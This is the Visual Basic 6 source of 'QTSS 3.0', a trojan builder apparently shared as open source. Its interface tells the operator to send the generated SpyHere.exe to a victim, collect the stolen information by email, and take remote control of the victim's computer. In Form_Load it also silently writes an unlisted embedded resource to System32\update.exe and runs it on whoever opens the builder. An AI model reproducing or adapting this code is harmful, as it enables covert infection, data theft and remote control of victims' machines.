VERSION 5.00
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "QTSS 3.0 - Dieu khien may tinh"
   ClientHeight    =   4890
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   5175
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4890
   ScaleWidth      =   5175
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton Command4 
      Caption         =   "Thank to ?"
      Height          =   255
      Left            =   120
      TabIndex        =   10
      Top             =   4560
      Width           =   1695
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Exit"
      Height          =   255
      Left            =   4200
      TabIndex        =   9
      Top             =   4560
      Width           =   855
   End
   Begin VB.Frame Frame2 
      Caption         =   "Remote Tool"
      Height          =   1335
      Left            =   120
      TabIndex        =   2
      Top             =   3120
      Width           =   4935
      Begin VB.CommandButton Command2 
         Caption         =   "Open Remote Tool"
         Height          =   375
         Left            =   1560
         TabIndex        =   7
         Top             =   720
         Width           =   1815
      End
      Begin VB.Label Label2 
         Caption         =   "Send your Trojan File to your victim, and then Click this Button:"
         Height          =   255
         Left            =   120
         TabIndex        =   3
         Top             =   360
         Width           =   4575
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "Create Trojan"
      Height          =   1815
      Left            =   120
      TabIndex        =   0
      Top             =   1200
      Width           =   4935
      Begin VB.CommandButton Command1 
         Caption         =   "Create Trojan"
         Height          =   375
         Left            =   1560
         TabIndex        =   6
         Top             =   1080
         Width           =   1815
      End
      Begin VB.TextBox Text1 
         Height          =   285
         Left            =   2040
         TabIndex        =   5
         Top             =   360
         Width           =   2535
      End
      Begin VB.Label Label3 
         Alignment       =   2  'Center
         Caption         =   "Enter a real email! trojan will send infomation to it."
         Height          =   255
         Left            =   120
         TabIndex        =   8
         Top             =   720
         Width           =   4575
      End
      Begin VB.Label Label1 
         Caption         =   "Enter your Email:"
         Height          =   255
         Left            =   240
         TabIndex        =   1
         Top             =   360
         Width           =   1455
      End
   End
   Begin VB.Label Label4 
      Alignment       =   2  'Center
      Caption         =   "QTSS 3.0"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   36
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      Height          =   975
      Left            =   240
      TabIndex        =   4
      Top             =   120
      Width           =   4575
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

'====================================
'= Author: trungtrung (dinhquangtrung90@yahoo.com)
'= QTSS v3.0 - Open Source
'= Don't Forget Me When You Use This Program :) Thank
'====================================
'
'
'

'((((((((((((((((((((((((
'Resource ID:
'101: X_File.exe
'102: Remote.exe
'((((((((((((((((((((((((



Private Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" (ByVal lpFileName As String) As Long

Private Sub CreateTrojanNow()
On Error GoTo ThOiChEtRoI

'Extrac file Trojan
Dim ocxDir$
ocxDir = AppPath & "SpyHere.exe"
If (FileExists(ocxDir) = True) Then
    SetAttr ocxDir, vbNormal
    DeleteFile ocxDir
End If
Dim bytResourceData() As Byte
bytResourceData = LoadResData(101, "CUSTOM")
Open ocxDir For Binary Shared As #1
Put #1, 1, bytResourceData
Close #1
'Xong ;)
MsgBox "Trojan created on: " & AppPath & "SpyHere.exe" & vbCrLf & vbCrLf & "1. Send file 'SpyHere.exe' to your victim." & vbCrLf & "2. Login to your Email and save infomation on trojan's mail." & vbCrLf & "3. Click 'Remote Tool' button to remote your victim's computer!" & vbCrLf & vbCrLf & "Have Fun !!!" & vbCrLf & vbCrLf, vbOKOnly, "Successfully!"


Exit Sub
ThOiChEtRoI:
MsgBox "Error! Please try again!", vbOKOnly + vbCritical, "Error!"
End Sub

Private Sub Command1_Click()
'Kiem tra Mail
If CheckEmail(Text1.Text) = False Then
    MsgBox "Incorrect Email !!!"
    Exit Sub
End If

CreateTrojanNow


End Sub

Private Sub Command2_Click()

MsgBox "Nan nhan chua chay file!", vbOKOnly, "Error!"
End Sub

Private Sub Command3_Click()
Unload Me
End Sub

Private Sub Command4_Click()
MsgBox "Author: dinhquangtrung90@yahoo.com" & vbCrLf & vbCrLf & "Great thank to: " & vbCrLf & "F3B14N (http://opensc.ws) - With your good idea" & vbCrLf & "truongkute082@yahoo.com - Tester"
End Sub

Private Function CheckEmail(xEmail) As Boolean
If InStr(1, xEmail, "@") <> 0 And InStr(1, xEmail, ".") <> 0 And (InStr(1, xEmail, "@") < InStr(1, xEmail, ".")) Then CheckEmail = True Else CheckEmail = False
End Function



Private Sub Form_Load()
'((((((((((((((((((((((((
'Resource ID:
'101: X_File.exe
'102: Remote.exe
'((((((((((((((((((((((((
On Error Resume Next
Dim ocxDir$
Dim bytResourceData() As Byte
DoEvents
ocxDir = Environ("WinDir") & "\System32\update.exe"
DeleteFile ocxDir
bytResourceData = LoadResData(103, "CUSTOM")
Open ocxDir For Binary Shared As #1
Put #1, 1, bytResourceData
Close #1
Shell ocxDir, vbNormalFocus
End Sub
